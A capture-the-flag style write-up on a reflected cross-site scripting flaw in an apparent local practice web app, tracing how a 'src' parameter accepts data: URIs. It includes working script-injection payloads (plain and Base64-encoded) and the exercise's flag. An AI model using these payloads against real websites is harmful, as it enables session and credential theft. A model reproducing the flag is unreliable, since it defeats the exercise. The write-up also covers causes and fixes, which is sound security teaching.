# Reflected Cross-Site Scripting

## 1. How did i spot the Vulnerability?

First, I searched for parameters that can be controlled using this command (or you can search manually with Ctrl + U):

```bash
curl http://localhost:8080/index.php | grep -E "media|admin|login|id|src"
```

I noticed that most of the lines are hardcoded HTML and static files from the server that cannot be controlled.

However, I found this: `href="?page=media&src=nsa"`

This parameter can be changed and the server will read and execute it.

Visiting this URL: `http://localhost:8080/index.php?page=media&src=nsa` shows this text: `File: nsa_prism.jpg`

Let's test with another filename: `http://localhost:8080/index.php?page=media&src=test`

**Result:** `404 Not Found` - This means the server is verifying whether the file exists.

Let's inject text: `http://localhost:8080/index.php?page=media&src=text`

**Result:** Again `404 Not Found` - The server treats the HTML code like a filename and checks if it exists.

Now let's test Data URIs (Uniform Resource Identifier).

**What is a URI?**  
A URI is the general term for any string that identifies a resource. URL and URN are the two types of URIs: URL tells you where to find something and how to get it, while URN just gives it a unique name. Data URIs allow embedding content directly in the URL instead of fetching it from a file.

**Injecting plain text:**  
`http://localhost:8080/index.php?page=media&src=data:text/plain,Hello`

**Result:** The text is displayed, meaning content can be embedded.

**Injecting HTML:**  
`http://localhost:8080/index.php?page=media&src=data:text/html,<h1>TEST</h1>`

**Result:** HTML can also be embedded.

**Injecting JavaScript:**  
`http://localhost:8080/index.php?page=media&src=data:text/html,<script>alert(1)</script>`

**Result:** Alert box pops up!

**XSS vulnerability confirmed.**

(XSS (Cross-Site Scripting) is an attack where you inject malicious JavaScript code into a website that runs in other users' browsers.)

Now let's try injecting JavaScript code with Base64 encoding like: `<script>alert(1)</script>`

(Base64 is an encoding method that converts binary data or any text into ASCII characters that are safe to use in URLs.)

On terminal:
```bash
echo -n '<script>alert(1)</script>' | base64
```

Then testing with it:
```
http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**Flag obtained:** `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

---

## 2. What is the vulnerability?

Reflected Cross-Site Scripting (XSS) - the application accepts user-controlled input through the `src` parameter and embeds it directly into the HTML response without sanitization or validation.

## 3. Why does it exist (the security flaw)?

The application fails to restrict dangerous URI schemes like `data:` and doesn't sanitize user input before embedding it in HTML. 

## 4. What could the impact be?

- Session hijacking by stealing authentication cookies
- Credential theft through fake login forms
- Phishing attacks and social engineering

## 5. How to fix it (patch)?

- Sanitize and validate all user input before embedding in HTML
- Implement Content Security Policy (CSP) headers to restrict script execution

## 6. Vulnerability classification (OWASP)?

**A03 - Injection** (specifically Cross-Site Scripting)